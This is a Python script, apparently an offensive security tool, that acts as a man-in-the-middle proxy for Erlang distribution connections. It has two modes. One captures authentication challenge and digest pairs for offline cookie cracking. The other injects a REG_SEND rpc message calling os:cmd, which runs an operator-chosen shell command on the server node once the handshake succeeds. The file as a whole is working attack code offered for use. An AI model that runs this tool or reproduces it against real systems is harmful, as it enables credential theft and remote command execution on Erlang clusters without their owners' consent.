#!/usr/bin/env python

import sys
import socket
from struct import pack, unpack
import asyncore
import argparse
import traceback
from binascii import hexlify
import erlang as erl


parser = argparse.ArgumentParser(description='Man-in-the-middle Erlang distribution proxy')
parser.add_argument('--lhost', default='127.0.0.1', help='Address to bind to')
parser.add_argument('--lport', type=int, default=31337, help='Address to bind to')
parser.add_argument('--target', default=None, help='The target to connect to. By default, transparent proxying will be used to get the original address. Use this option if you use proxying, not transparent proxying.')
parser.add_argument('--collect-challenges', default=False, action='store_true', help='Collect and output challenges')
parser.add_argument('--inject-cmd', type=str, default=None, help='Shell command to inject when authenticated')

args = parser.parse_args()

if not args.collect_challenges and not args.inject_cmd:
  print >>sys.stderr, 'please use one of command injection or challenges collecter options'
  sys.exit(1)


SO_ORIGINAL_DST = 80

def send_cmd(name, cmd):
  # REG_SEND control message
  ctrl_msg = (6,
    erl.OtpErlangPid(erl.OtpErlangAtom(name),'\x00\x00\x00\x03','\x00\x00\x00\x00','\x00'),
    erl.OtpErlangAtom(''),
    erl.OtpErlangAtom('rex'))
  msg = (
    erl.OtpErlangPid(erl.OtpErlangAtom(name),'\x00\x00\x00\x03','\x00\x00\x00\x00','\x00'),
    (
      erl.OtpErlangAtom('call'),
      erl.OtpErlangAtom('os'),
      erl.OtpErlangAtom('cmd'),
      [cmd],
      erl.OtpErlangAtom('user')
    ))

  new_data = '\x70' + erl.term_to_binary(ctrl_msg) + erl.term_to_binary(msg)

  return pack('!I', len(new_data)) + new_data


class DistConn(asyncore.dispatcher):
  def __init__(self, sock=None, map=None, conn=True, verbose=False):
    self.out_buffer = b''
    self.in_buffer = b''

    self.verbose = verbose
    self.allsent = False

    self.act_as_server = False
    self.act_as_client = False
    self.authenticated = False

    self.challenge = None
    self.digest = None

    if conn is True:
      assert(sock)

      if not args.target:
        orig_dst = sock.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)
        _, port, a1, a2, a3, a4 = unpack('!HHBBBBxxxxxxxx', orig_dst)
        host = '%d.%d.%d.%d' % (a1, a2, a3, a4)
      else:
        (host, port) = args.target.split(':')
        port = int(port, 10)

      self.conn_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      self.conn_sock.connect((host, port))
      self.act_as_server = True

      self.sock_class = DistConn(sock=self.conn_sock, conn=self)
    else:
      self.sock_class = conn
      self.conn_sock = None
      self.act_as_client = True

    asyncore.dispatcher.__init__(self, sock, map)

  def initiate_send(self):
    num_sent = asyncore.dispatcher.send(self, self.out_buffer[:4096])
    self.out_buffer = self.out_buffer[num_sent:]

  def handle_write(self):
    self.initiate_send()

  def writable(self):
    return (self.allsent or len(self.out_buffer) > 0)

  def send(self, data):
    if data:
      self.out_buffer += data
    else:
      self.allsent = True

  def handle_read(self):
    data = self.recv(1024)
    self.sock_class.send(data)

    if not self.authenticated:
      self.in_buffer += data

    while len(self.in_buffer) >= 3:
      (length, opcode) = unpack('!Hc', self.in_buffer[:3])
      if len(self.in_buffer) < length + 2: break

      data = self.in_buffer[:2+length]
      self.in_buffer = self.in_buffer[2+length:]

      tag = 'as_client'
      if self.act_as_server: tag = 'as_server'

      print('[!] %s %r' % (tag, data))

      if opcode in ('a', 'r', 'n', 's'):
        if self.act_as_client and opcode == 'n':
          (version, flags, challenge) = unpack('!HII', data[3:13])
          self.challenge = challenge
          self.server_name = data[13:]

        elif self.act_as_server and opcode == 'n':
          self.client_name = data[9:]

        elif self.act_as_server and opcode == 'r':
          (challenge,) = unpack('!I', data[3:7])
          digest = data[7:23]
          assert(len(digest) == 16)

          self.challenge = challenge
          self.digest = digest
          self.authenticated = True

          if args.collect_challenges:
            print('md5(cookie|%d) = %s' % (self.sock_class.challenge, hexlify(self.digest)))

        elif self.act_as_client and opcode == 'a':
          digest = data[3:19]
          assert(len(digest) == 16)

          self.digest = digest
          self.authenticated = True

          if args.collect_challenges:
            print('md5(cookie|%d) = %s' % (self.sock_class.challenge, hexlify(self.digest)))

          if args.inject_cmd:
            print('[!!!] INJECTING %r to server' % args.inject_cmd)
            self.sendall(send_cmd(self.sock_class.client_name, args.inject_cmd))
            print('[!!!] DONE')

  def handle_close(self):
    leftover = len(self.sock_class.out_buffer)
    while leftover > 0:
      self.sock_class.initiate_send()
      leftover = len(self.sock_class.out_buffer)

    self.sock_class.close()
    self.close()

  def handle_error(self):
    t, v, tb = sys.exc_info()
    print('DistConn error: %s : %s\n%s' % (t, v, tb))

class DistServer(asyncore.dispatcher):
  def __init__(self, host, port):
    asyncore.dispatcher.__init__(self)
    self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
    self.set_reuse_addr()
    self.bind((host, port))
    self.listen(64)

  def handle_accept(self):
    pair = self.accept()
    if pair:
      sock, addr = pair
      self.sock = sock
      handler = DistConn(sock)

  def handle_close(self):
    self.sock.close()
    self.close()

  def handle_error(self):
    t, v, tb = sys.exc_info()
    print('DistServer error: %s : %s\n%s' % (t, v, tb))


try:
  server = DistServer(args.lhost, args.lport)
  print('[*] listening on %s:%d' % (args.lhost, args.lport))
  if args.target:
    print('[*] working in non transparent mode, will connect to %s' % args.target)
  else:
    print('[*] working in transparent mode')
  asyncore.loop()
except KeyboardInterrupt:
  print('')
  sys.exit(0)
except Exception as e:
  sys.stderr.write(traceback.format_exc())
  sys.exit(1)

